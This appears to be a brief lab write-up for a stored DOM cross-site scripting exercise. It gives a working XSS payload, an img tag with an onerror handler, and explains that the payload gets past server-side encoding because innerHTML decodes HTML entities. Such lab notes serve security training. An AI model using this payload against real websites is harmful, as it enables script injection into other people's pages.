# Lab 13 — Stored DOM XSS (PRACTITIONER)

## Payload
```
<><img src=1 onerror=alert(1)>
```
innerHTML decodes HTML entities — server-side encoding is bypassed.
